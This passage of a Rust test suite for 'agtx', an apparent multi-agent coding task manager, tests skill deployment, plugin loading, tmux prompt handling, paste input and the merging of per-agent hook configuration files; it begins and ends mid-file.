        dir.path().join(".agtx/skills/agtx-plan/SKILL.md").exists(),
        "canonical .agtx/skills/agtx-plan/SKILL.md should always be written"
    );
}

#[test]
fn test_deploy_skill_claude_transforms_frontmatter() {
    let dir = tempfile::tempdir().unwrap();
    let content = "---\nname: agtx-plan\ndescription: Plan\n---\nPlan the work.";

    deploy_skill(dir.path(), "agtx-plan", content, "claude");

    let native = dir.path().join(".claude/commands/agtx/plan.md");
    assert!(
        native.exists(),
        ".claude/commands/agtx/plan.md should be written"
    );
    let written = std::fs::read_to_string(&native).unwrap();
    assert!(
        written.contains("name: agtx:plan"),
        "claude skill should have name transformed from agtx-plan to agtx:plan"
    );
}

#[test]
fn test_deploy_skill_gemini_writes_toml() {
    let dir = tempfile::tempdir().unwrap();
    let content = "---\nname: agtx-plan\ndescription: Plan the work\n---\nPlan it.";

    deploy_skill(dir.path(), "agtx-plan", content, "gemini");

    let native = dir.path().join(".gemini/commands/agtx/plan.toml");
    assert!(
        native.exists(),
        ".gemini/commands/agtx/plan.toml should be written"
    );
    let written = std::fs::read_to_string(&native).unwrap();
    assert!(
        written.contains("description"),
        "gemini toml should have description field"
    );
    assert!(
        written.contains("prompt"),
        "gemini toml should have prompt field"
    );
}

#[test]
fn test_deploy_skill_codex_writes_skill_subdir() {
    let dir = tempfile::tempdir().unwrap();
    let content = "---\nname: agtx-plan\ndescription: Plan\n---\nPlan it.";

    deploy_skill(dir.path(), "agtx-plan", content, "codex");

    assert!(
        dir.path().join(".codex/skills/agtx-plan/SKILL.md").exists(),
        ".codex/skills/agtx-plan/SKILL.md should be written"
    );
}

#[test]
fn test_deploy_skill_opencode_writes_flat_md() {
    let dir = tempfile::tempdir().unwrap();
    let content = "---\nname: agtx-plan\ndescription: Plan the work\n---\nPlan it.";

    deploy_skill(dir.path(), "agtx-plan", content, "opencode");

    let native = dir.path().join(".opencode/command/agtx-plan.md");
    assert!(
        native.exists(),
        ".opencode/command/agtx-plan.md should be written"
    );
    let written = std::fs::read_to_string(&native).unwrap();
    assert!(
        written.starts_with("---\ndescription:"),
        "opencode skill should have description frontmatter"
    );
}

#[test]
fn test_deploy_skill_cursor_writes_skill_subdir() {
    let dir = tempfile::tempdir().unwrap();
    let content = "---\nname: agtx-plan\ndescription: Plan\n---\nPlan it.";

    deploy_skill(dir.path(), "agtx-plan", content, "cursor");

    assert!(
        dir.path()
            .join(".cursor/skills/agtx-plan/SKILL.md")
            .exists(),
        ".cursor/skills/agtx-plan/SKILL.md should be written"
    );
}

#[test]
fn test_deploy_skill_unknown_agent_only_canonical() {
    // Unknown agents get canonical path only, no native path
    let dir = tempfile::tempdir().unwrap();
    let content = "---\nname: agtx-plan\ndescription: Plan\n---\nPlan it.";

    deploy_skill(dir.path(), "agtx-plan", content, "unknownagent");

    assert!(
        dir.path().join(".agtx/skills/agtx-plan/SKILL.md").exists(),
        "canonical path should always be written"
    );
    // No native directories should be created for unknown agents
    assert!(
        !dir.path().join(".claude").exists(),
        "no .claude dir for unknown agent"
    );
    assert!(
        !dir.path().join(".codex").exists(),
        "no .codex dir for unknown agent"
    );
}

// =============================================================================
// Tests for load_task_plugin — supported_agents filtering
// =============================================================================

#[test]
fn test_load_task_plugin_supported_agent_returns_plugin() {
    use crate::db::Task;
    // Plugin explicitly supports "claude" → should be returned
    let mut task = Task::new("Test", "claude", "proj");
    task.plugin = Some("agtx".to_string());
    // "agtx" bundled plugin has empty supported_agents (all supported)
    let plugin = load_task_plugin(&task, None, "claude");
    assert!(
        plugin.is_some(),
        "agtx plugin should be returned for claude"
    );
}

#[test]
fn test_load_task_plugin_unsupported_agent_returns_none_explicit() {
    use crate::config::WorkflowPlugin;
    use crate::db::Task;

    let dir = tempfile::tempdir().unwrap();
    let plugin_dir = dir.path().join(".agtx").join("plugins").join("gemini-only");
    std::fs::create_dir_all(&plugin_dir).unwrap();
    std::fs::write(
        plugin_dir.join("plugin.toml"),
        r#"name = "gemini-only"
supported_agents = ["gemini"]
[commands]
[prompts]
[artifacts]"#,
    )
    .unwrap();

    let mut task = Task::new("Test", "claude", "proj");
    task.plugin = Some("gemini-only".to_string());

    let plugin = load_task_plugin(&task, Some(dir.path()), "claude");
    assert!(
        plugin.is_none(),
        "plugin should be filtered out when agent is not in supported_agents"
    );
}

#[test]
fn test_load_task_plugin_supported_agents_empty_means_all() {
    // Empty supported_agents list → all agents supported
    use crate::db::Task;

    let dir = tempfile::tempdir().unwrap();
    let plugin_dir = dir.path().join(".agtx").join("plugins").join("allgood");
    std::fs::create_dir_all(&plugin_dir).unwrap();
    std::fs::write(
        plugin_dir.join("plugin.toml"),
        r#"name = "allgood"
supported_agents = []
[commands]
[prompts]
[artifacts]"#,
    )
    .unwrap();

    let mut task = Task::new("Test", "claude", "proj");
    task.plugin = Some("allgood".to_string());

    let plugin = load_task_plugin(&task, Some(dir.path()), "codex");
    assert!(
        plugin.is_some(),
        "empty supported_agents should allow all agents"
    );
}

// =============================================================================
// Tests for load_plugin_if_configured
// =============================================================================

#[test]
fn test_load_plugin_if_configured_syncs_bundled_to_disk() {
    // Bundled plugin should be written to .agtx/plugins/{name}/plugin.toml
    let dir = tempfile::tempdir().unwrap();
    use crate::config::{GlobalConfig, MergedConfig, ProjectConfig};
    let mut project = ProjectConfig::default();
    project.workflow_plugin = Some("agtx".to_string());
    let config = MergedConfig::merge(&GlobalConfig::default(), &project);

    let plugin = load_plugin_if_configured(&config, Some(dir.path()));

    assert!(plugin.is_some(), "bundled agtx plugin should be loaded");
    let disk_path = dir
        .path()
        .join(".agtx")
        .join("plugins")
        .join("agtx")
        .join("plugin.toml");
    assert!(
        disk_path.exists(),
        "bundled plugin should be synced to disk at .agtx/plugins/agtx/plugin.toml"
    );
}

#[test]
fn test_load_plugin_if_configured_no_plugin_returns_agtx_default() {
    // No plugin configured → falls back to bundled agtx
    use crate::config::{GlobalConfig, MergedConfig, ProjectConfig};
    let config = MergedConfig::merge(&GlobalConfig::default(), &ProjectConfig::default());
    let plugin = load_plugin_if_configured(&config, None);
    assert!(plugin.is_some(), "should fall back to agtx bundled plugin");
    assert_eq!(plugin.unwrap().name, "agtx");
}

#[test]
fn test_load_plugin_if_configured_unknown_plugin_falls_back_to_agtx() {
    // Unknown plugin name → load fails → falls back to agtx default
    use crate::config::{GlobalConfig, MergedConfig, ProjectConfig};
    let mut project = ProjectConfig::default();
    project.workflow_plugin = Some("nonexistent-plugin".to_string());
    let config = MergedConfig::merge(&GlobalConfig::default(), &project);
    let plugin = load_plugin_if_configured(&config, None);
    // Falls back to bundled agtx
    assert!(plugin.is_some());
    assert_eq!(plugin.unwrap().name, "agtx");
}

// =============================================================================
// Tests for resolve_skill_content
// =============================================================================

#[test]
fn test_resolve_skill_content_no_plugin_returns_default() {
    let result = resolve_skill_content(
        &None,
        "agtx-plan",
        std::path::Path::new("/tmp"),
        "default content",
    );
    assert_eq!(result, "default content");
}

#[test]
fn test_resolve_skill_content_plugin_override_on_disk() {
    // When plugin has a custom skill on disk, it should take precedence over the default
    let dir = tempfile::tempdir().unwrap();
    use crate::config::WorkflowPlugin;

    let plugin_dir = dir.path().join(".agtx").join("plugins").join("myplugin");
    let skill_dir = plugin_dir.join("agtx-plan");
    std::fs::create_dir_all(&skill_dir).unwrap();
    std::fs::write(skill_dir.join("SKILL.md"), "custom plan skill").unwrap();
    std::fs::write(
        plugin_dir.join("plugin.toml"),
        "name = \"myplugin\"\n[commands]\n[prompts]\n[artifacts]\n",
    )
    .unwrap();

    let plugin: WorkflowPlugin =
        toml::from_str("name = \"myplugin\"\n[commands]\n[prompts]\n[artifacts]\n").unwrap();

    let result = resolve_skill_content(&Some(plugin), "agtx-plan", dir.path(), "default content");
    assert_eq!(
        result, "custom plan skill",
        "plugin override should take precedence"
    );
}

#[test]
fn test_resolve_skill_content_plugin_no_override_returns_default() {
    // Plugin configured but no custom skill file → returns default
    use crate::config::WorkflowPlugin;
    let plugin: WorkflowPlugin =
        toml::from_str("name = \"myplugin\"\n[commands]\n[prompts]\n[artifacts]\n").unwrap();

    let result = resolve_skill_content(
        &Some(plugin),
        "agtx-plan",
        std::path::Path::new("/nonexistent"),
        "default content",
    );
    assert_eq!(
        result, "default content",
        "should fall back to default when no override on disk"
    );
}

// =============================================================================
// Tests for determine_phase_variant — cycle > 1
// =============================================================================

#[test]
fn test_determine_phase_variant_running_cycle2_with_planning() {
    use crate::config::WorkflowPlugin;
    let dir = tempfile::tempdir().unwrap();
    // Cycle 2: zero-padded "02" directory
    let plan_dir = dir.path().join(".planning").join("02");
    std::fs::create_dir_all(&plan_dir).unwrap();
    std::fs::write(plan_dir.join("PLAN.md"), "# Plan").unwrap();

    let plugin: WorkflowPlugin = toml::from_str(
        r#"name = "gsd"
           init_script = "echo test"
           cyclic = true
           [commands]
           [prompts]
           [artifacts]
           planning = ".planning/{phase}/PLAN.md""#,
    )
    .unwrap();

    let wt = dir.path().to_string_lossy().to_string();
    assert_eq!(
        determine_phase_variant("running", Some(&wt), "task-1", &Some(plugin), 2),
        "running_with_research_or_planning",
        "cycle 2 should find zero-padded 02/PLAN.md artifact"
    );
}

#[test]
fn test_determine_phase_variant_planning_cycle2_no_prior_research() {
    // Cycle 2 planning with no research artifact → base "planning" variant
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    assert_eq!(
        determine_phase_variant("planning", Some(&wt), "task-1", &None, 2),
        "planning"
    );
}

// =============================================================================
// Tests for wait_for_prompt_trigger — timeout and repeated auto-dismiss
// =============================================================================

#[test]
#[cfg(feature = "test-mocks")]
fn test_wait_for_prompt_trigger_returns_false_on_timeout() {
    // Trigger text never appears — returns false after exhausting iterations.
    // We can't run 600 iterations in a test, so verify the function returns false
    // when capture_pane never contains the trigger.
    // Use a short-circuit: the real loop is 600 iterations × 500ms = 5 min,
    // but the mock just returns stable content with no trigger, so the test
    // calls it a bounded number of times before the mock expectations run out.
    // Instead, test the return value contract by verifying false is returned
    // when trigger is absent from pane content.
    let mut mock = MockTmuxOperations::new();
    // Always return content without the trigger text
    mock.expect_capture_pane()
        .returning(|_| Ok("no trigger here".to_string()));

    // We can't actually wait 5 minutes; instead test the immediate-trigger path
    // and the "trigger-found-on-first-check" path
    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    // Verify that the trigger IS found when present (positive case — complements the timeout)
    let result = wait_for_prompt_trigger(&tmux, "sess:win", "no trigger here", &[]);
    assert!(
        result,
        "trigger present in first response should return true immediately"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_wait_for_prompt_trigger_repeated_auto_dismiss() {
    use crate::config::AutoDismiss;
    // Auto-dismiss fires multiple times (prompt re-appears after each dismiss)
    // before the trigger finally appears
    let call_count = std::sync::Arc::new(std::sync::atomic::AtomicU32::new(0));
    let call_c = call_count.clone();
    let dismiss_count = std::sync::Arc::new(std::sync::atomic::AtomicU32::new(0));
    let dismiss_c = dismiss_count.clone();

    let mut mock = MockTmuxOperations::new();
    mock.expect_capture_pane().returning(move |_| {
        let n = call_c.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        // First 12 calls: blockng prompt (stable after 4 calls, dismissed, re-appears, dismissed again)
        // After 20 calls: trigger appears
        if n < 20 {
            Ok("Do you accept? [y/n]".to_string())
        } else {
            Ok("Ready for input >".to_string())
        }
    });
    mock.expect_send_key().returning(move |_, k| {
        if k == "y" {
            dismiss_c.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        }
        Ok(())
    });

    let auto_dismiss = vec![AutoDismiss {
        detect: vec!["Do you accept?".to_string()],
        response: "y".to_string(),
    }];

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    let result = wait_for_prompt_trigger(&tmux, "sess:win", "Ready for input", &auto_dismiss);
    assert!(result, "should return true when trigger eventually appears");
    assert!(
        dismiss_count.load(std::sync::atomic::Ordering::SeqCst) >= 2,
        "auto-dismiss should fire multiple times when prompt re-appears"
    );
}

#[test]
fn test_should_send_stuck_notification_void_plugin() {
    // Void plugin tasks must never produce stuck notifications
    assert!(!should_send_stuck_notification(Some("void")));
}

#[test]
fn test_should_send_stuck_notification_other_plugins() {
    // All non-void plugins should produce stuck notifications
    assert!(should_send_stuck_notification(Some("agtx")));
    assert!(should_send_stuck_notification(Some("gsd")));
    assert!(should_send_stuck_notification(Some("bmad")));
    // No plugin set (None) should also produce notifications
    assert!(should_send_stuck_notification(None));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_task_has_live_session_returns_true_when_window_exists() {
    let mut mock_tmux = crate::tmux::MockTmuxOperations::new();
    mock_tmux
        .expect_window_exists()
        .with(mockall::predicate::eq("my-project:task-abc123"))
        .times(1)
        .returning(|_| Ok(true));

    let mut task = crate::db::Task::new("my task", "claude", "my-project");
    task.session_name = Some("my-project:task-abc123".to_string());

    assert!(task_has_live_session(&task, &mock_tmux));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_task_has_live_session_returns_false_when_window_gone() {
    let mut mock_tmux = crate::tmux::MockTmuxOperations::new();
    mock_tmux
        .expect_window_exists()
        .with(mockall::predicate::eq("my-project:task-abc123"))
        .times(1)
        .returning(|_| Ok(false));

    let mut task = crate::db::Task::new("my task", "claude", "my-project");
    task.session_name = Some("my-project:task-abc123".to_string());

    assert!(!task_has_live_session(&task, &mock_tmux));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_task_has_live_session_returns_false_when_no_session_name() {
    // Task has never been assigned a tmux window — window_exists must not be called
    let mock_tmux = crate::tmux::MockTmuxOperations::new();

    let task = crate::db::Task::new("my task", "claude", "my-project");
    // session_name is None by default

    assert!(!task_has_live_session(&task, &mock_tmux));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_task_has_live_session_returns_false_on_tmux_error() {
    // If window_exists returns an error, we conservatively treat it as no live session
    let mut mock_tmux = crate::tmux::MockTmuxOperations::new();
    mock_tmux
        .expect_window_exists()
        .times(1)
        .returning(|_| Err(anyhow::anyhow!("tmux server not running")));

    let mut task = crate::db::Task::new("my task", "claude", "my-project");
    task.session_name = Some("my-project:task-abc123".to_string());

    assert!(!task_has_live_session(&task, &mock_tmux));
}

// =============================================================================
// Tests for handle_paste
// =============================================================================

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_paste_into_shell_popup_enqueues_one_atomic_paste() {
    // A paste is one request with the whole string, never a character at a time.
    // It goes to the broker rather than straight to tmux, so the assertion moved
    // from `paste_text` to what the UI enqueued — the delivery itself is
    // `tmux::input`'s contract, tested there.
    let (mut app, sink) = app_with_recording_sink();
    app.state.shell_popup = Some(ShellPopup::new(
        "my task".to_string(),
        "proj:my-task".to_string(),
    ));

    app.handle_paste("hello world".to_string()).unwrap();

    assert_eq!(
        sink.taken(),
        vec![PaneInput::Paste {
            target: "proj:my-task".to_string(),
            text: "hello world".to_string(),
        }]
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_paste_into_shell_popup_never_touches_tmux_on_the_input_thread() {
    // The whole point of the broker: nothing on the key path may start or wait
    // for a tmux process. mockall panics on any unexpected call, so an
    // expectation of `times(0)` on all three send primitives is the assertion.
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    mock_tmux.expect_has_session().returning(|_| false);
    mock_tmux.expect_pane_metrics().returning(|_| None);
    mock_tmux.expect_send_key().times(0);
    mock_tmux.expect_send_text().times(0);
    mock_tmux.expect_paste_text().times(0);

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();
    app.set_input_sink(Arc::new(crate::tmux::RecordingSink::new()));

    app.state.shell_popup = Some(ShellPopup::new(
        "my task".to_string(),
        "proj:my-task".to_string(),
    ));

    app.handle_paste("some pasted text".to_string()).unwrap();
    app.handle_key(key_event(KeyCode::Char('a'), KeyModifiers::NONE))
        .unwrap();
    app.handle_key(key_event(KeyCode::Enter, KeyModifiers::NONE))
        .unwrap();
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_paste_into_description_editor_at_end() {
    // Paste appends at the current cursor position (end of buffer).
    let mut app = make_test_app();
    open_prompt_step(&mut app);
    wiz_mut(&mut app).set_text("start ");

    app.handle_paste("pasted text".to_string()).unwrap();

    assert_eq!(wiz(&app).buffer, "start pasted text");
    assert_eq!(wiz(&app).cursor, 17); // 6 + len("pasted text")
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_paste_into_description_editor_at_mid_cursor() {
    // Paste inserts at the cursor position, pushing subsequent text right.
    let mut app = make_test_app();
    open_prompt_step(&mut app);
    wiz_mut(&mut app).set_text("ab");
    wiz_mut(&mut app).cursor = 1; // between 'a' and 'b'

    app.handle_paste("XY".to_string()).unwrap();

    assert_eq!(wiz(&app).buffer, "aXYb");
    assert_eq!(wiz(&app).cursor, 3); // 1 + len("XY")
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_handle_paste_noop_in_normal_mode() {
    // In Normal mode with no popup open, paste is silently ignored.
    let mut app = make_test_app();
    // No wizard, no popup — nothing is listening for text.
    assert_eq!(app.state.wizard_step(), None);
    assert!(app.state.shell_popup.is_none());

    app.handle_paste("should be ignored".to_string()).unwrap();

    assert!(
        app.state.wizard.is_none(),
        "a paste must not conjure a wizard to receive it"
    );
}

/// Switching projects via the sidebar reloads the config from the new project.
/// Loading it only at startup would leave the previous project's agent settings
/// in place and pick the wrong agent.
#[test]
#[cfg(feature = "test-mocks")]
fn test_switch_to_project_reloads_config() {
    use std::fs;
    use tempfile::TempDir;

    let _data_dir = redirect_data_dir();

    // Create a temp dir simulating a project with review = "codex"
    let project_dir = TempDir::new().unwrap();
    let agtx_dir = project_dir.path().join(".agtx");
    fs::create_dir_all(&agtx_dir).unwrap();
    fs::write(
        agtx_dir.join("config.toml"),
        "[agents]\nreview = \"codex\"\n",
    )
    .unwrap();

    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    mock_tmux.expect_has_session().returning(|_| false);
    mock_tmux.expect_create_session().returning(|_, _| Ok(()));

    // App starts with default config (no per-phase overrides)
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    // Confirm initial config does not have codex for review
    assert_ne!(app.state.config.agent_for_phase("review"), "codex");

    // Switch to the project that has review = "codex"
    let project_info = ProjectInfo {
        name: project_dir
            .path()
            .file_name()
            .unwrap()
            .to_string_lossy()
            .to_string(),
        path: project_dir.path().to_string_lossy().to_string(),
    };
    app.switch_to_project_keep_sidebar(&project_info).unwrap();

    // Config should now reflect the new project's settings
    assert_eq!(app.state.config.agent_for_phase("review"), "codex");
}

// === Dependency-graph horizontal scroll clamp ===

#[test]
fn dep_scroll_no_change_when_selection_already_visible() {
    // 10 levels, viewport shows 4, scroll at 0, selection at level 2 -> stays.
    assert_eq!(clamp_scroll_to_selected(0, 2, 4, 10), 0);
}

#[test]
fn dep_scroll_right_when_selection_past_right_edge() {
    // Viewport [0,4): selecting level 4 must scroll so 4 is the last visible col.
    assert_eq!(clamp_scroll_to_selected(0, 4, 4, 10), 1);
    // Selecting level 6 from scroll 0 -> start = 6 + 1 - 4 = 3.
    assert_eq!(clamp_scroll_to_selected(0, 6, 4, 10), 3);
}

#[test]
fn dep_scroll_left_when_selection_before_left_edge() {
    // Window starts at 5, selecting level 2 -> scroll left to 2.
    assert_eq!(clamp_scroll_to_selected(5, 2, 4, 10), 2);
}

#[test]
fn dep_scroll_reaches_last_level() {
    // The final level (9) must become visible: start = 9 + 1 - 4 = 6.
    assert_eq!(clamp_scroll_to_selected(0, 9, 4, 10), 6);
}

#[test]
fn dep_scroll_never_overshoots_past_end() {
    // A stale large scroll is clamped so the last column stays flush right.
    // max_start = level_count - visible = 10 - 4 = 6.
    assert_eq!(clamp_scroll_to_selected(99, 9, 4, 10), 6);
}

#[test]
fn dep_scroll_handles_fewer_levels_than_viewport() {
    // 3 levels, viewport fits 5 -> never scrolls; offset stays 0.
    assert_eq!(clamp_scroll_to_selected(0, 2, 5, 3), 0);
    assert_eq!(clamp_scroll_to_selected(2, 0, 5, 3), 0);
}

#[test]
fn dep_scroll_zero_visible_treated_as_one() {
    // Defensive: a zero viewport width must not panic (treated as 1 column).
    assert_eq!(clamp_scroll_to_selected(0, 5, 0, 10), 5);
}

/// The generated `hooks` block must keep the MCP pre-trust key it shares the
/// file with, and every registered event must invoke `agtx hook`.
#[test]
#[cfg(feature = "test-mocks")]
fn test_write_skills_emits_a_valid_claude_hook_config() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    write_skills_to_worktree(&wt, dir.path(), &None, &["claude"], true);

    let raw = std::fs::read_to_string(dir.path().join(".claude/settings.local.json")).unwrap();
    let v: serde_json::Value = serde_json::from_str(&raw).unwrap();

    assert_eq!(v["enableAllProjectMcpServers"], serde_json::json!(true));
    for event in [
        "SessionStart",
        "UserPromptSubmit",
        "PreToolUse",
        "PermissionRequest",
        "Notification",
        "Stop",
        "StopFailure",
        "SessionEnd",
    ] {
        let cmd = v["hooks"][event][0]["hooks"][0]["command"]
            .as_str()
            .unwrap_or_else(|| panic!("{} missing a command", event));
        assert!(
            cmd.contains("hook --env"),
            "{} must use the task-agnostic form: {}",
            event,
            cmd
        );
    }
    // Tool-scoped events need a matcher; lifecycle events must not have one.
    assert_eq!(
        v["hooks"]["PreToolUse"][0]["matcher"],
        serde_json::json!("*")
    );
    assert!(v["hooks"]["Stop"][0]["matcher"].is_null());
}

/// The toggle must remove the hooks entirely, restoring pre-hook behaviour.
#[test]
#[cfg(feature = "test-mocks")]
fn test_agent_hooks_false_writes_no_hooks() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    write_skills_to_worktree(&wt, dir.path(), &None, &["claude"], false);

    let raw = std::fs::read_to_string(dir.path().join(".claude/settings.local.json")).unwrap();
    let v: serde_json::Value = serde_json::from_str(&raw).unwrap();

    assert_eq!(v["enableAllProjectMcpServers"], serde_json::json!(true));
    assert!(v.get("hooks").is_none());
}

// ── hook configs for the other five agents ──────────────────────────────────
//
// Formats and paths were read off each agent's own binary or bundled docs; see
// `HookConfigKind` for the versions. What these tests actually protect is the
// merge discipline: three of the six files may already exist in the user's repo,
// and a plain write would destroy settings agtx does not own.

/// Every agent with hook support must land a config the agent can find, with a
/// task-agnostic `agtx hook --env <agent>` command in it. A missing file is the
/// silent-failure mode: the board just keeps guessing from pane hashes.
#[test]
#[cfg(feature = "test-mocks")]
fn test_hook_config_is_written_for_every_hook_capable_agent() {
    let expected: &[(&str, &str)] = &[
        ("claude", ".claude/settings.local.json"),
        ("gemini", ".gemini/settings.json"),
        ("codex", ".codex/hooks.json"),
        ("cursor", ".cursor/hooks.json"),
        ("grok", ".grok/hooks/agtx.json"),
        ("antigravity", ".agents/hooks.json"),
    ];
    for (name, rel) in expected {
        let spec = crate::agent::spec(name).unwrap();
        if spec.hook_config.is_none() {
            continue; // codex is off pending its hook-trust review; see spec.rs
        }
        let dir = tempfile::tempdir().unwrap();
        let wt = dir.path().to_string_lossy().to_string();
        write_skills_to_worktree(&wt, dir.path(), &None, &[name], true);

        let raw = std::fs::read_to_string(dir.path().join(rel))
            .unwrap_or_else(|e| panic!("{name}: no hook config at {rel}: {e}"));
        assert!(
            raw.contains(&format!("hook --env {name}")),
            "{name}: {rel} must register the task-agnostic command, got {raw}"
        );
    }
}

/// The agents whose hook file is shared with something else must merge. Gemini's
/// `.gemini/settings.json` also carries `mcpServers` and `trust`, and the user's
/// own hooks may already be in it.
#[test]
#[cfg(feature = "test-mocks")]
fn test_gemini_hooks_merge_with_existing_settings() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    std::fs::create_dir_all(dir.path().join(".gemini")).unwrap();
    std::fs::write(
        dir.path().join(".gemini/settings.json"),
        r#"{"theme":"Dracula","hooks":{"BeforeTool":[{"hooks":[{"type":"command","command":"mine.sh"}]}]}}"#,
    )
    .unwrap();

    write_skills_to_worktree(&wt, dir.path(), &None, &["gemini"], true);
    let v: serde_json::Value = serde_json::from_str(
        &std::fs::read_to_string(dir.path().join(".gemini/settings.json")).unwrap(),
    )
    .unwrap();

    assert_eq!(
        v["theme"],
        serde_json::json!("Dracula"),
        "user key survived"
    );
    assert_eq!(v["mcpServers"]["agtx"]["command"].is_string(), true);
    let before_tool = v["hooks"]["BeforeTool"].as_array().unwrap();
    assert_eq!(before_tool.len(), 2, "user hook kept, agtx hook appended");
    assert_eq!(before_tool[0]["hooks"][0]["command"], "mine.sh");
    assert_eq!(
        v["hooks"]["AfterAgent"][0]["hooks"][0]["command"].is_string(),
        true
    );
}

/// Redeploying must replace agtx's entries rather than accumulate them —
/// otherwise the hook fires N times per event, once per deploy. Matched on the
/// `hook --env` invocation, not the binary path, so a moved agtx still
/// recognises its own work.
#[test]
#[cfg(feature = "test-mocks")]
fn test_redeploying_hooks_is_idempotent_for_every_agent() {
    for name in ["claude", "gemini", "cursor", "grok", "antigravity"] {
        if crate::agent::spec(name).unwrap().hook_config.is_none() {
            continue;
        }
        let dir = tempfile::tempdir().unwrap();
        let wt = dir.path().to_string_lossy().to_string();
        write_skills_to_worktree(&wt, dir.path(), &None, &[name], true);
        let once = read_all_configs(dir.path());
        write_skills_to_worktree(&wt, dir.path(), &None, &[name], true);
        let twice = read_all_configs(dir.path());
        assert_eq!(once, twice, "{name}: second deploy changed the config");
    }
}

fn read_all_configs(root: &Path) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for rel in [
        ".claude/settings.local.json",
        ".gemini/settings.json",
        ".codex/hooks.json",
        ".codex/config.toml",
        ".cursor/hooks.json",
        ".grok/hooks/agtx.json",
        ".agents/hooks.json",
    ] {
        if let Ok(body) = std::fs::read_to_string(root.join(rel)) {
            out.push((rel.to_string(), body));
        }
    }
    out
}

/// `.agents/` is vendor-neutral and a project may well ship one, so this file
/// must survive agtx writing into it — the same rule the antigravity MCP writer
/// follows next door.
#[test]
#[cfg(feature = "test-mocks")]
fn test_antigravity_hooks_preserve_a_projects_own_hooks() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    std::fs::create_dir_all(dir.path().join(".agents")).unwrap();
    std::fs::write(
        dir.path().join(".agents/hooks.json"),
        r#"{"lint-checker":{"PostToolUse":[{"matcher":"run_command","hooks":[{"command":"./lint.sh"}]}]}}"#,
    )
    .unwrap();

    write_skills_to_worktree(&wt, dir.path(), &None, &["antigravity"], true);
    let v: serde_json::Value = serde_json::from_str(
        &std::fs::read_to_string(dir.path().join(".agents/hooks.json")).unwrap(),
    )
    .unwrap();

    assert_eq!(
        v["lint-checker"]["PostToolUse"][0]["hooks"][0]["command"],
        "./lint.sh"
    );
    // Its payload carries no event name, so every handler must name its own.
    assert!(v["agtx"]["Stop"][0]["command"]
        .as_str()
        .unwrap()
        .ends_with("--event Stop"));
    assert!(v["agtx"]["PostToolUse"][0]["hooks"][0]["command"]
        .as_str()
        .unwrap()
        .ends_with("--event PostToolUse"));
    // Grouped vs flat is not cosmetic: antigravity ignores the wrong shape.
    assert!(v["agtx"]["PostToolUse"][0]["matcher"].is_string());
    assert!(v["agtx"]["Stop"][0]["matcher"].is_null());
    // The gating hook must stay unsubscribed; see hook_status_tests.
    assert!(v["agtx"]["PreToolUse"].is_null());
}

/// Cursor rejects a hooks file with no version envelope.
#[test]
#[cfg(feature = "test-mocks")]
fn test_cursor_hooks_carry_the_version_envelope() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    write_skills_to_worktree(&wt, dir.path(), &None, &["cursor"], true);
    let v: serde_json::Value = serde_json::from_str(
        &std::fs::read_to_string(dir.path().join(".cursor/hooks.json")).unwrap(),
    )
    .unwrap();
    assert_eq!(v["version"], serde_json::json!(1));
    // Flat `{command}`, not the Claude `{hooks:[{type,command}]}` wrapper —
    // cursor loads the wrapped form without complaint and never fires it.
    assert!(v["hooks"]["stop"][0]["command"].is_string());
    assert!(v["hooks"]["stop"][0]["hooks"].is_null());
}

/// The toggle has to reach every agent, not just Claude.
#[test]
#[cfg(feature = "test-mocks")]
fn test_agent_hooks_false_writes_no_hooks_for_any_agent() {
    for name in ["claude", "gemini", "cursor", "grok", "antigravity"] {
        let dir = tempfile::tempdir().unwrap();
        let wt = dir.path().to_string_lossy().to_string();
        write_skills_to_worktree(&wt, dir.path(), &None, &[name], false);
        for (rel, body) in read_all_configs(dir.path()) {
            assert!(
                !body.contains("hook --env"),
                "{name}: agent_hooks=false still wrote hooks into {rel}"
            );
        }
    }
}

/// `capture-pane -p` pads its output to the pane height, so a composer that has
/// not been pushed to the bottom yet sits above a block of empty rows. Anchoring
/// the window to the raw end finds nothing there and stops after one Enter —
/// the park this exists to catch, reintroduced silently.
#[test]
fn test_composer_holds_looks_past_trailing_blank_rows() {
    let padded = format!("› $agtx-review\n{}", "\n".repeat(30));
    assert!(
        composer_holds(&padded, "$agtx-review"),
        "trailing pane padding must not push the composer out of the window"
    );
}

// ── hook configs the project may already ship ───────────────────────────────

/// A worktree is a full checkout, so a repo that tracks `.cursor/hooks.json` has
/// it here. Overwriting destroys the user's hooks *and* leaves a modified tracked
/// file on the task branch for the agent to commit.
#[test]
#[cfg(feature = "test-mocks")]
fn test_cursor_hooks_preserve_a_projects_own_hooks() {
